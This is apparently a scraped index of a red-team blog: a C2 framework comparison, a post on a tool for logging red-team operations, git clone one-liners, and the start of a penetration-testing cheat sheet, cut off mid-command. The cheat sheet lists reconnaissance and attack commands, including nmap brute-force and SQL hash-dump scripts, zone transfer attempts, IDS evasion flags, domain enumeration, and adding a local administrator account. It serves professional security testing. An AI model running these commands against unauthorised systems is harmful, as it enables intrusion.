Ability to fwd specific session types (web, application, etc.) to lateral systems via console</li> </ul> <p>Legend:</p> <ul> <li>X- Yes</li> <li>L - Limited</li> <li>B - By using a binary</li> <li>- - No (or not native)</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#apfell","title":"Apfell","text":"<p>Code: Python https://github.com/its-a-feature/Apfell License: BSD-3</p> <p>Pros:</p> <ul> <li>Python</li> <li>Extensible code base</li> <li>Crossplatform</li> <li>Docker</li> <li>Web UI</li> <li>JavaScript for Automation (Mac OS)</li> <li>Chrome Extension Payload</li> <li>Very Cobalt Strike(ish)</li> <li>Reporting (Artifacts, ATT&amp;CK Mapping, PDF of Tasks)</li> </ul> <p>Cons:</p> <ul> <li>Python 2.7 or multiple errors</li> <li>RabbitMQ</li> <li>Lots of \u201cToDos\u201c and feature changes planned</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#cobalt-strike","title":"Cobalt Strike","text":"<p>Code: Sleep https://www.cobaltstrike.com/ License: Commercial</p> <p>Pros:</p> <ul> <li>Collaborative</li> <li>Well tested</li> <li>Highly capable</li> <li>Recon, Phishing, Post-Exp, Browser Pivoting, C2, Reporting</li> <li>Kits for extensibility</li> <li>https://www.cobaltstrike.com/help-externalc2</li> <li>https://github.com/xorrior/raven</li> </ul> <p>Cons:</p> <ul> <li>Windows Specific</li> <li>PO problems</li> <li>Mods require custom kits or sleep builds</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#covenant","title":"Covenant","text":"<p>Code: C# https://github.com/cobbr/Covenant License: GNU GPL3</p> <p>Pros:</p> <ul> <li>Extensible code base (with exp)</li> <li>Multi-User</li> <li>Crossplatform</li> <li>Docker</li> <li>Web UI</li> <li>Chrome Extension Payload</li> <li>Many Cobalt Strike similarities</li> </ul> <p>Cons:</p> <ul> <li>Written in C#</li> <li>Only HTTP(s) listeners</li> <li>Constructing complex Tasks can be annoying (if not time consuming)</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#empire","title":"Empire","text":"<p>Code: Python https://github.com/EmpireProject/Empire License: BSD3</p> <p>Pros:</p> <ul> <li>Multi-platform</li> <li>Written in python</li> <li>Versatile</li> </ul> <p>Cons:</p> <ul> <li>Poor documentation (good at the time but outdated)</li> <li>Poor logging</li> <li>End of Life</li> <li>Often buggy</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#faction","title":"Faction","text":"<p>Code: https://github.com/FactionC2/Faction License: BSD3</p> <p>Pros:</p> <ul> <li>Micro Service Architecture</li> <li>Extensible</li> <li>Communicates via message queues (JSON based)</li> <li>Fully functional API (API required)</li> <li>Crossplatform</li> <li>Rest and Socket.IO</li> <li>RBAC</li> <li>SQL Query Capable</li> <li>WebUI</li> </ul> <p>Cons:</p> <ul> <li>Relies on RabbitMQ</li> <li>Buggy</li> <li>Limited review</li> <li>Unproven</li> <li>Disk (states single line exec, but none worked in testing)</li> <li>No native AV evasion</li> <li>States it\u2019s a PoC so may be further dev\u2019d or dropped</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#ibombshell","title":"iBombshell","text":"<p>Code: https://github.com/ElevenPaths/ibombshell License: GNU GPL3</p> <p>Pros:</p> <ul> <li>Memory Resident</li> <li>Modules can be written easily (PS)</li> <li>Build based on Metasploit</li> </ul> <p>Cons:</p> <ul> <li>Buggy, buggy, buggy!</li> <li>PowerShell (Req PS 3.0^)</li> <li>Windows (Partially supports linux with PS and python)</li> <li>Limited review</li> <li>Base Framework flags AV</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#koadic","title":"Koadic","text":"<p>Code: https://github.com/zerosum0x0/koadic License: Apache 2</p> <p>Pros:</p> <ul> <li>PowerShell</li> <li>Based on Metasploit (need MSF for full use)</li> <li>Easily track domain users vs admins</li> </ul> <p>Cons:</p> <ul> <li>Windows Only</li> <li>PowerShell</li> <li>Limited maintenance</li> <li>Limited review</li> <li>Requires cleartext creds for sessions or tokens (no keys/PTH/Kerb/etc)</li> <li>Base flags AV</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#merlin","title":"Merlin","text":"<p>Code: https://github.com/Ne0nd0g/merlin License: GNU GPL3</p> <p>Pros:</p> <ul> <li>Cross Platform</li> <li>Extensible</li> <li>HTTP/2</li> <li>Metasploit Similarities</li> <li>Leverages multiple known proven modules</li> </ul> <p>Cons:</p> <ul> <li>Buggy</li> <li>Limited review</li> <li>Requires binaries/file loads to disk</li> <li>Limited capability for mem resident (recompile is buggy)</li> <li>No native AV obfuscation</li> <li>Significant dll mods to avoid AV</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#pinjectra","title":"Pinjectra","text":"<p>Code: https://github.com/SafeBreach-Labs/pinjectra License: BSD3</p> <p>Pros:</p> <ul> <li>TBD</li> </ul> <p>Cons:</p> <ul> <li>Not C2</li> <li>TBD</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#poshc2","title":"PoshC2","text":"<p>Code: https://github.com/nettitude/PoshC2_Python License: BSD3</p> <p>Pros:</p> <ul> <li>PowerShell</li> <li>Python</li> <li>Cross Platform</li> <li>Metasploit Styled</li> <li>Config controls all settings</li> </ul> <p>Cons:</p> <ul> <li>Disk based</li> <li>No native AV obfuscation</li> <li>Payloads generated at server instantiation</li> <li>Single user console (additional consoles requires hole in fw for access unless on common port i.e. those you want for OPS)</li> <li>Separate server and console screens</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#sliver","title":"Sliver","text":"<p>Code: https://github.com/BishopFox/sliver License: GNU GPL3</p> <p>Pros:</p> <ul> <li>Crossplatform</li> <li>Anit-forensics (? Untested)</li> <li>Attempts to enforce good OPSEC</li> <li>Agents will reconnect if proc crash (within given timeframe)</li> <li>Agent info provided during profile generation</li> <li>Stable so far (no unvalidated crashes)</li> <li>Did not produce any alerts</li> <li>Native builds did not flag AV (Defender, CrowdStrike, Tanium. McAfee)</li> </ul> <p>Cons:</p> <ul> <li>In Alpha</li> <li>Limited review</li> <li>Limited capabilities</li> <li>Generating with symbols takes a while (requires additional memory on server)</li> <li>Proc crashes if memory overrun (need several GB for generation)</li> <li>Generating without symbols is fast but is less obfuscated</li> <li>Cannot change callback timing</li> <li>Nearly interactive</li> <li>No logging</li> <li>Last check-in was not accurate in testing</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#silenttrinity","title":"Silenttrinity","text":"<p>Code: https://github.com/byt3bl33d3r/SILENTTRINITY License: GNU GPL3</p> <p>Pros:</p> <ul> <li>Crossplatform</li> <li>Collaborative</li> <li>All actions logged</li> <li>Recently rewritten</li> </ul> <p>Cons:</p> <ul> <li>Recently rewritten</li> <li>HTTP/1.1</li> <li>Limited review</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#trevorc2","title":"TrevorC2","text":"<p>Code: https://github.com/trustedsec/trevorc2 License: WTH</p> <p>Pros:</p> <ul> <li>Does not use POST for exfil</li> <li>Mirrors chosen site for use</li> <li>Simple Interface</li> <li>Traffic looks like legit web (b64 to initial viewing)</li> <li>Can be used across platforms</li> <li>Alternates callback intervals</li> <li>Notes indicate future dev</li> </ul> <p>Cons:</p> <ul> <li>Extremely limited</li> <li>Console has limited native functionality</li> <li>Looks like a project idea that hasn't taken off quite yet</li> </ul>"},{"location":"blogs/2019/c2-agent-comparison/#results","title":"Results","text":"<p>Of the 12 C2 listed, none are viable for my needs in long-term operations. Several have benefits for short-term OPS; however, drawbacks must be weighed against operational objectives.</p> <p>Cobalt Strike is extremely useful and viable for Windows based operations or if used in conjunction with a second C2.</p> <p>If 2 were required outside Cobalt Strike, Sliver would be my first and Faction second choices with very specific use cases for each.</p>"},{"location":"blogs/2019/event-data-collector/","title":"EVENT DATA COLLECTOR (EDC)","text":"<p>James Tubberville | November 12, 2019 | Tweet This Post: </p> <p></p> <p>Event Data Collector (EDC) is a very basic django application used to capture data on the fly.</p> <p>It is primarily designed to facilitate the flow of a cohesive red team by enabling both manual and automated collection of operational activities and information. It's not fancy, was designed in stages to meet the need of the hour, and has had some elements removed to protect multiple organizations.</p> <p>It is expected only RT members assigned to the operation and those designated as Trusted Agents (TA), White Cell, or Control Cell members with a need-to-know will use EDC.</p> <p>You can find the latest info, code, and setup instructions on Github.</p>"},{"location":"blogs/2019/event-data-collector/#general-information","title":"General Information","text":""},{"location":"blogs/2019/event-data-collector/#views","title":"Views","text":"<p>Views are based off templates rather than builds. This enables the team to choose what is displayed in the view and what requires viewing the entry detail.</p> <ul> <li>Info (info): Information about the event</li> <li>OPLOG (oplogs) Operator Logs - Log entries of all actions</li> <li>Targets (targets): Actioned Targets - Any target asset where actions are performed (succeed or fail)</li> <li>Credentials (creds): Obtained Target Credentials - files, mimikatz, keylogging, etc.</li> <li>Payloads (payloads): Location for storing pre-made payloads (escalation, c2, peristance, etc.)</li> <li>Deconfliction (decon): Deconfliction Data - Basic data! Defensive elements (Blue Teams, SOC, etc.) side should provide more data for verified deconfliction. Note decon is just a subset of oplog data.</li> </ul> <p>Examples:</p> <p>Full oplog view </p> <p>oplog command and output </p> <p>Targets View </p> <p>Credentials View </p> <p>Payloads </p> <p>Deconfliction </p>"},{"location":"blogs/2019/event-data-collector/#urls","title":"URLs","text":"<ul> <li>info/</li> <li>oplogs/</li> <li>targets/</li> <li>creds/</li> <li>payloads/</li> <li>decon/</li> <li>tag/ - quick identification of tagged logs (tag/c2, tag/observation, tag/persistence)</li> <li>user/ - list of logs per operator (user/testerld)</li> <li>rta/ - Admin Dashboard (change this as desired)</li> </ul>"},{"location":"blogs/2019/event-data-collector/#rest-framework","title":"Rest Framework","text":"<p>(Requires IsStaff for access)</p> <ul> <li>eventinfo/</li> <li>oplog/</li> <li>cred/</li> <li>target/</li> <li>api-token/ &lt; Generate Key</li> </ul>"},{"location":"blogs/2019/event-data-collector/#authentication-and-authorization","title":"Authentication and Authorization","text":"<p>EDC requires an account to be assigned a role for any access. Although individual permissions can be applied, it is highly recommended to use the role based permissions.</p>"},{"location":"blogs/2019/event-data-collector/#roles-groups","title":"Roles (Groups)","text":"<ul> <li>Lead: Event lead or manager - Has privileges to all edc actions</li> <li>Operator: Operator or keyboarder - Has privileges to most edc actions less some permanent delete</li> <li>WhiteCell: Has only view privileges for Info and Deconfliction - Trusted Agent, Observer, Data Scientist, etc.</li> </ul>"},{"location":"blogs/2019/event-data-collector/#role-permissions","title":"Role Permissions","text":"Permission Lead Operator WhiteCell add cred x x - view cred x x - change cred x x - delete cred x x - add eventinfo x x - view eventinfo x x x change eventinfo x x - delete eventinfo x - - add oplog x x - view oplog x x - change oplog x x - delete oplog x x - add payload x x - view payload x x - change payload x x - delete payload x x - add target x x - view target x x - change target x x - delete target x x - add decon x x - view decon x x x change decon x x - delete decon x x -"},{"location":"blogs/2019/event-data-collector/#accounts","title":"Accounts","text":"<p>It is recommended to create new accounts and remove the examples once functionality of new are confirmed.</p> Username Password Role edcadmin admin pass1 Superuser (Admin Dash) testerld user passld Lead Role testerop user passwc Operator tester1 user pass1 Operator tester2 user pass2 Operator testerwc user passwc WhiteCell"},{"location":"blogs/2019/event-data-collector/#account-permissions","title":"Account Permissions","text":"User Role Info Oplog Targets Creds Payload Deconfliction edcadmin Super RWD RWD RWD RWD RWD RWD testerld lead RWD RWD RWD RWD RWD RWD testerop operator RW RWD RWD RWD RWD RW tester1 operator RW RWD RWD RWD RWD RW tester2 operator RW RWD RWD RWD RWD RW testerwc whitecell R - - - - R"},{"location":"blogs/2019/event-data-collector/#2fa","title":"2FA","text":"<p>All accounts have the option for 2FA (Authenticator App). Each account will need to enable 2FA via profile.</p> <p></p> <p></p>"},{"location":"blogs/2019/event-data-collector/#consolidated-security-information","title":"Consolidated Security Information","text":"<ul> <li>Permission Based Roles (Groups)</li> <li>Login Required (Decorators or Mixins)</li> <li>Permission Required (Decorator or Mixins)</li> <li>Role Based Accounts</li> <li>Lead</li> <li>Operator</li> <li>White Cell</li> <li>Individual Accounts (no group or shared accounts)</li> <li>Multi-Factor Authentication</li> <li>2FA Token</li> <li>Protections</li> <li>SSL/TLS (Communication Transport)</li> <li>Click Jacking Protection</li> <li>Cross Site Request Forgery Protection</li> <li>Cross Site Scripting Protection</li> <li>Host Header Validation</li> <li>Sessions Security</li> <li>SQL Injection Protection</li> <li>User uploaded content<ul> <li>Profile limited to images</li> <li>All users can change respective profiles</li> <li>All other forms allow any file type</li> <li>Allows collection of various file types and interesting information</li> <li>Enables bypass of some XSS and CSRF protections (stored - file)</li> <li>Limited to only Leads and Operators (should be Trusted Users)</li> </ul> </li> <li>Drive or volume encryption recommended (DAR)</li> </ul>"},{"location":"blogs/2019/event-data-collector/#quick-tips","title":"Quick Tips","text":"<ul> <li>Tags can be any desired keyword useful to your team. These can be used to create a quick view for your desired case (i.e. identify all tagged findings)</li> </ul> <ul> <li>User tokens must be passed for access to the rest framework.</li> <li>All views have an associated template (vs. a tables build). Adding or removing fields from view is a simple as adding/removing from the template.</li> <li>Some secrets are hidden from view (i.e. the plaintext password is hidden on the creds table but visible in details)</li> <li>Setup instructions on github provides AWS S3 and Email Password Reset options</li> <li>Anyone can register (assuming it is actually open and avail on www)</li> <li>There are no permissions assigned by default. Login produces no views and no access</li> <li>The deployment should have restricted access (ACL), or be accessible only from VPN, etc.</li> <li>You may optionally restrict registrations to a specific email domain</li> <li>The bashrc is recommended for use as it saves terminal logs locally. It also has several simple example functions for submitting data to EDC. These bash examples should be binaries or python execs (client) in your path. The included functions accepts (or if omitted prompts for) entry data, appropriately names and captures a screenshot (if oplog), and submits the entry.</li> </ul>"},{"location":"blogs/2019/event-data-collector/#use","title":"Use","text":"<ul> <li>Manual entry</li> <li>Use the provided forms</li> <li>bash_functions (see github repo)</li> </ul> <pre><code>    log -h\n    cred -h\n    target -h\n</code></pre> <ul> <li>API (curl examples)</li> </ul> <pre><code># Obtain token\ncurl -d 'username=testerld&amp;password=user passld' https://domain.com/api-token/\n\n# Pull all oplogs (or /cred/ or /target/)\ncurl https://domain.com/oplog/ -H 'Authorization: Token 333...de8'\n\n# Post a new log entry\ncurl -d 'src_host=attackimage2&amp;src_ip=44.33.22.11&amp;dst_host=corpwks01&amp;dst_ip=143.144.145.146&amp;dst_port=445&amp;tool=terminal&amp;description=smb_relay&amp;result=success&amp;operator_id=9' https://domain.com/oplog/ -H 'Authorization: Token 333...de8'\n</code></pre>"},{"location":"blogs/2019/git-clone-entire-org/","title":"Clone all repos","text":"<p>James Tubberville | March 13, 2019 | Tweet This Post: </p> <p></p> <p>This is a short form post resulting from conversations over single line cloning and/or pulling of all organizational repos.</p> <p>In short, I once needed a quick and easy bash method for pulling all repos under an organizational tree. The following three one-liners were used (and have been used many times since). I regularly use the last to pull all repos before beginning any additions or mods to ThreatExpress.</p> <p>As usual, you can find the raw script and get the latest version of tools on our GitHub repository: https://github.com/threatexpress.</p> <p>Clone all public repos</p> <pre><code>for line in $(curl https://api.github.com/orgs/threatexpress/repos | grep -o \"git@github.com:threatexpress/[^ ,\\\"]\\+\");do echo git clone $line;done\n</code></pre> <p>Clone private repos as well</p> <pre><code>for line in $(curl https://api.github.com/orgs/threatexpress/repos?access_token=&lt;EnterTokenHere&gt; | grep -o \"git@github.com:threatexpress/[^ ,\\\"]\\+\");do git clone $line;done\n</code></pre> <p>Note</p> <p>Generate your personal access token in your github profile &gt; Developer Settings &gt; Personal Access Tokens</p> <p>Pull all repos within a hierarchical folder structure</p> <pre><code>find . -type d -depth 1 -exec git --git-dir={}/.git --work-tree=$PWD/{} pull \\;\n</code></pre> <p>Note</p> <p>I store all repos within organizational folders in a designated location. Change depth to accommodate your structure</p>"},{"location":"blogs/2019/penetration-testing-pasties/","title":"Penetration Testing Pasties","text":"<p>James Tubberville | January 11, 2019 | Tweet This Post: </p> <p></p> <p>'Pasties' started as a small file used to collect random bits of information and scripts that were common to many individual tests. Most of this is just a consolidation of publicly available information and things that Joe Vest (@joevest), Andrew Chiles (@andrewchiles), Derek Rushing, or myself (@minis_io) have found useful. Over time additional sections, section placeholders, snippets, and links were added for \"quick reference\" and has grown to quite a sizable markdown file. The more complex or longer sections will be separated into smaller more detailed write-ups; however, we decided to drop the short and generic info for public use now. Pasties data will also eventually be formatted and added to the wiki.</p> <p>As usual, you can find an updated version of pasties (and other tools) on GitHub: https://github.com/threatexpress.</p> <p>Penetration Testing Framework</p> <ul> <li>http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html</li> </ul> <p>Penetration Testing Execution Standard</p> <ul> <li>http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines</li> </ul> <p>Good writeup on passive information gathering</p> <ul> <li>http://www.securitysift.com/passive-reconnaissance/</li> </ul> <p>Password Breach Database, requires subscription</p> <p>https://leakbase.pw/</p>"},{"location":"blogs/2019/penetration-testing-pasties/#foca","title":"FOCA","text":""},{"location":"blogs/2019/penetration-testing-pasties/#maltego","title":"Maltego","text":""},{"location":"blogs/2019/penetration-testing-pasties/#reconng","title":"ReconNG","text":""},{"location":"blogs/2019/penetration-testing-pasties/#metagoofil","title":"Metagoofil","text":"<p>Source: http://resources.infosecinstitute.com/kali-reporting-tools/#gref</p> <p>Metagoofil is an information gathering tool designed for extracting metadata of public documents (pdf,doc,xls,ppt,docx,pptx,xlsx) related to a target domain. It can give a lot of important information by scanning the obtained files. It can generate an HTML page with the result of the metadata extracted, plus a list of potential usernames, very useful for preparing a brute force attack on open services like ftp, web application, VPN, pop3, etc.</p> <p>Metagoofil performs the following:</p> <ul> <li>Searches the given file type using the Google search engine</li> <li>Downloads all the documents found</li> <li>Extracts metadata from downloaded documents</li> <li>Saves the result in HTML file</li> </ul> <p>Perform document metadata searching on target domain using first 200 google results</p> <pre><code>    metagoofil -d &lt;target&gt;.com -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 200 -n 5 -o /tmp/metagoofil/ -f /tmp/metagoofil/result.html\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#censysio","title":"censys.io","text":"<p>Censys is a search engine that allows computer scientists to ask questions about the devices and networks that compose the Internet. Driven by Internet-wide scanning, Censys lets researchers find specific hosts and create aggregate reports on how devices, websites, and certificates are configured and deployed.</p> <ul> <li>Create an account and get an API key for use in ReconNG or manual searching</li> <li>https://censys.io/ipv4?q=</li> </ul> <p>Python API</p> <pre><code>    # pip install censys\n\n    import censys.ipv4\n    c = censys.ipv4.CensysIPv4(api_id=\"Get from MyAccount at censys.io\", api_secret=\"Get from MyAccount at censys.io\")\n    ranges=[\"X.X.X.0/24\", \"X.X.X.0/24\", \"X.X.X.0/24\"]\n    for range in ranges:\n        results = c.search(range)\n        for result in results:\n            for port in result[\"protocols\"]:\n                print result[\"ip\"] + \",\" + port\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#network-scanning","title":"Network Scanning","text":""},{"location":"blogs/2019/penetration-testing-pasties/#dsnrecon","title":"dsnrecon","text":"<p>Normal dns reverse lookup of IP range with CSV output</p> <pre><code>    dnsrecon -t rvl -r 1.2.3.4/24 -c output.csv\n</code></pre> <p>Perform default enumeration of a domain</p> <pre><code>    dnsrecon -d &lt;domain&gt;\n</code></pre> <p>Perform zone transfer attempt</p> <pre><code>    dnsrecon -t axfr -d &lt;domain&gt;\n\n    \u2570 $ dnsrecon -h\n    Version: 0.8.10\n    Usage: dnsrecon.py &lt;options&gt;\n\n    Options:\n       -h, --help                   Show this help message and exit.\n       -d, --domain      &lt;domain&gt;   Target domain.\n       -r, --range       &lt;range&gt;    IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).\n       -n, --name_server &lt;name&gt;     Domain server to use. If none is given, the SOA of the target will be used.\n       -D, --dictionary  &lt;file&gt;     Dictionary file of subdomain and hostnames to use for brute force.\n       -f                           Filter out of brute force domain lookup, records that resolve to the wildcard defined\n                                    IP address when saving records.\n       -t, --type        &lt;types&gt;    Type of enumeration to perform:\n                                    std       SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.\n                                    rvl       Reverse lookup of a given CIDR or IP range.\n                                    brt       Brute force domains and hosts using a given dictionary.\n                                    srv       SRV records.\n                                    axfr      Test all NS servers for a zone transfer.\n                                    goo       Perform Google search for subdomains and hosts.\n                                    snoop     Perform cache snooping against all NS servers for a given domain, testing\n                                              all with file containing the domains, file given with -D option.\n                                    tld       Remove the TLD of given domain and test against all TLDs registered in IANA.\n                                    zonewalk  Perform a DNSSEC zone walk using NSEC records.\n       -a                           Perform AXFR with standard enumeration.\n       -s                           Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.\n       -g                           Perform Google enumeration with standard enumeration.\n       -w                           Perform deep whois record analysis and reverse lookup of IP ranges found through\n                                    Whois when doing a standard enumeration.\n       -z                           Performs a DNSSEC zone walk with standard enumeration.\n       --threads         &lt;number&gt;   Number of threads to use in reverse lookups, forward lookups, brute force and SRV\n                                    record enumeration.\n       --lifetime        &lt;number&gt;   Time to wait for a server to response to a query.\n       --db              &lt;file&gt;     SQLite 3 file to save found records.\n       --xml             &lt;file&gt;     XML file to save found records.\n       --iw                         Continue brute forcing a domain even if a wildcard records are discovered.\n       -c, --csv         &lt;file&gt;     Comma separated value file.\n       -j, --json        &lt;file&gt;     JSON file.\n       -v                           Show attempts in the brute force modes.\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#theharvester","title":"TheHarvester","text":"<p>Perform lookup against  with additional DNS reverse on all ranges discovered <pre><code>    theharvester -d &lt;domain&gt; -c -n -b google -l 1000 [-f output]\n\n    Usage: theharvester options\n\n           -d: Domain to search or company name\n           -b: data source: google, googleCSE, bing, bingapi, pgp\n                            linkedin, google-profiles, people123, jigsaw,\n                            twitter, googleplus, all\n\n           -s: Start in result number X (default: 0)\n           -v: Verify host name via dns resolution and search for virtual hosts\n           -f: Save the results into an HTML and XML file\n           -n: Perform a DNS reverse query on all ranges discovered\n           -c: Perform a DNS brute force for the domain name\n           -t: Perform a DNS TLD expansion discovery\n           -e: Use this DNS server\n           -l: Limit the number of results to work with(bing goes from 50 to 50 results,\n           -h: use SHODAN database to query discovered hosts\n                google 100 to 100, and pgp doesn't use this option)\n\n    Examples:\n            theharvester -d microsoft.com -l 500 -b google\n            theharvester -d microsoft.com -b pgp\n            theharvester -d microsoft -l 200 -b linkedin\n            theharvester -d apple.com -b googleCSE -l 500 -s 300\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#nmap","title":"Nmap","text":"<p>https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/OpsPlan2016.txt</p> <p>Host discovery <code>nmap -sn -n &lt;targets&gt;         nmap -A &lt;host&gt; (run this second)         nmap -sV -F         nmap -p- -sV -O -T4 -v7 -sC</code></p> <p>Open SMB shares <code>nmap --script=smb-enum-shares -p445</code></p> <p>Open NFS Shares <code>nmap -p 111,2049 --script nfs-ls,nfs-showmount</code></p> <p>UDP scan: <code>nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5 &lt;targets&gt;</code></p> <p>Anonymous FTP <code>nmap -sC -sV -p21         nmap -sV -n -sS -Pn-vv --open -p21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 &lt;targets&gt;</code></p> <p>VNC Brute <code>nmap --script=vnc-brute -p5800,5900</code></p> <p>Rawr Scan <code>nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web</code></p> <p>MSSQL Scan <code>nmap -vv-sV -Pn-n -p1433 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=1433,smsql.username-sa,mssql.password-sa &lt;targets&gt; -oA &lt;outfile&gt;</code></p> <p>HTTP Scan <code>nmap -vv -sS -Pn-n -p80,443,8080 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-email-harvest,http-methods,http-method-tamper,http-passwd,http-robots.txt &lt;targets&gt; -oA &lt;outfile&gt;</code></p>"},{"location":"blogs/2019/penetration-testing-pasties/#ids-evasion","title":"IDS Evasion","text":"<p>Append extra random data to change default packet lengths</p> <pre><code>    \u2013data-length 15\n</code></pre> <p>Randomize scan order</p> <pre><code>    -randomize-hosts\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#web","title":"Web","text":""},{"location":"blogs/2019/penetration-testing-pasties/#eyewitness","title":"Eyewitness","text":"<p>Get the most recent version</p> <pre><code>    git clone https://github.com/ChrisTruncer/EyeWitness.git\n</code></pre> <p>Faster Scan</p> <pre><code>    ./EyeWitness.py --web -f hosts.txt --timeout 5 --threads 10 -d /mnt/event/Recon/ew --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https\n</code></pre> <p>Slow version via proxychains</p> <pre><code>    proxychains ./EyeWitness.py --web -f hosts.txt --timeout 10 --threads 2 -d /mnt/event/Recon/ew --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https\n\n    proxychains ./EyeWitness.py --web -x nmaphosts.xml --timeout 10 --threads 2 -d /mnt/event/Recon/ew2 --no-dns --results 1000 --no-prompt --user-agent IE --add-https-ports 443,8443 --add-http-ports 80,8080 --prepend-https\n</code></pre> <p>Proxychains specify a remote DNS server</p> <p>http://carnal0wnage.attackresearch.com/2013/09/changing-proxychains-hardcoded-dns.html</p> <pre><code>    On Kali linux its found here: /usr/lib/proxychains3/proxyresolv\n\n        #!/bin/sh\n        # This script is called by proxychains to resolve DNS names\n        # DNS server used to resolve names\n        DNS_SERVER=4.2.2.2\n\n        if [ $# = 0 ] ; then\n         echo \" usage:\"\n         echo \"  proxyresolv &lt;hostname&gt; \"\n         exit\n        fi\n\n        export LD_PRELOAD=libproxychains.so.3\n        dig $1 @$DNS_SERVER +tcp | awk '/A.+[0-9]+\\.[0-9]+\\.[0-9]/{print $5;}'\n</code></pre> <p>Use Canary tokens to identify web front-end vulnerabilities</p> <p>In combination with Burp collaborator, identify configuration issues with web front-end appliances</p> <p>For example, issue request to target domain with a custom Host header pointing to your collaborator/canary:</p> <p>Request:</p> <pre><code>    GET / HTTP/1.1\n    Host: uniqid.burpcollaborator.net\n    Connection: close\n</code></pre> <p>Response (on Collaborator):</p> <pre><code>    GET / HTTP/1.1\n    Host: XX.X.XXX.XX:8082\n\n\n    HTTP/1.1 200 Connection Established\n    Date: Tue, 07 Feb 2017 16:32:50 GMT\n    Transfer-Encoding: chunked\n    Connection: close\n\n    Ok\n    / HTTP/1.1 is unavailable\n    Ok\n    Unknown Command\n    Ok\n    Unknown Command\n    Ok\n    Unknown Command\n    Ok\n</code></pre> <p>Canarytokens.org Blog - Targeting HTTP's Hidden Attack Surface</p>"},{"location":"blogs/2019/penetration-testing-pasties/#windows","title":"Windows","text":""},{"location":"blogs/2019/penetration-testing-pasties/#built-in-commands","title":"Built-in Commands","text":"<p>View your current user:</p> <pre><code>    whoami\n</code></pre> <p>View information about the current user:</p> <pre><code>    net user myuser(for a local user)\n    net user myuser /domain (for a domain user)\n</code></pre> <p>View the local groups:</p> <pre><code>    net localgroup\n</code></pre> <p>View the local administrators:</p> <pre><code>    net localgroup Administrators\n</code></pre> <p>Add a new user:</p> <pre><code>    net user myuser mypass /add\n</code></pre> <p>Add a user in the local Administrators group:</p> <pre><code>    net localgroup Administrators myuser /add\n</code></pre> <p>View the domain name of current machine:</p> <pre><code>    net config workstation\n    net config server\n</code></pre> <p>View the name of the domain controller:</p> <pre><code>    reg query \"HKEY_LOCAL_MACHINE\\ SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\ History\" /v DCName\n</code></pre> <p>or</p> <pre><code>    Import-Module ActiveDirectory; (Get-ADDomainController -DomainName corp.test.com -Discover -NextClosestSite).HostName\n</code></pre> <p>or</p> <pre><code>    set l\n</code></pre> <p>Get list of DCs</p> <pre><code>    nltest /dclist:domainname\n</code></pre> <p>or</p> <pre><code>    netdom query /D:domin DC\n</code></pre> <p>or</p> <pre><code>    dsquery server\n</code></pre> <p>or</p> <pre><code>    nslookup -type=srv _ldap._tcp.dc._msdcs.corp.test.com\n</code></pre> <p>Get DC Info</p> <pre><code>    nltest /dsgetdc:domain\n</code></pre> <p>Get DC site mapping</p> <pre><code>    nltest /dsaddresstosite:dcname.corp.test.com\n</code></pre> <p>Get PDC</p> <pre><code>    netdom query /D:domain PDC\n</code></pre> <p>or</p> <pre><code>    nslookup -type=srv _ldap._tcp.pdc._msdcs.corp.test.com\n</code></pre> <p>or get roles</p> <p>Get Roles</p> <pre><code>    netdom query /D:domain FSMO\n</code></pre> <p>List trusts</p> <pre><code>nltest /domain_trust\n</code></pre> <p>or</p> <pre><code>nltest /trusted_domains\n</code></pre> <p>or</p> <pre><code>get-adtrust -Filter *\n</code></pre> <p>Get DC for Trusted Domains</p> <pre><code>$t=Get-AdTrust -Filter * |Select -expandproperty Name;foreach($line in $t){nltest /dclist:$line}\n</code></pre> <p>View the list of domain users:</p> <pre><code>    C:\\&gt; wmic useraccount where (domain='%USERDOMAIN%') get Name &gt; userlist.txt\n\n    PS C:\\&gt; ([adsisearcher]\"objectCategory=User\").Findall() | ForEach\n    {$_.properties.samaccountname} | Sort | Out-File -Encoding ASCII users.txt\n</code></pre> <p>or</p> <pre><code>    net user /domain\n</code></pre> <p>Get domain info (including DC)</p> <pre><code>    gpresult /z\n</code></pre> <p>View the list of domain admins:</p> <pre><code>    net group \"Domain Admins\" /domain\n</code></pre> <p>View domain groups</p> <pre><code>    net group /domain\n    powershell (new-object 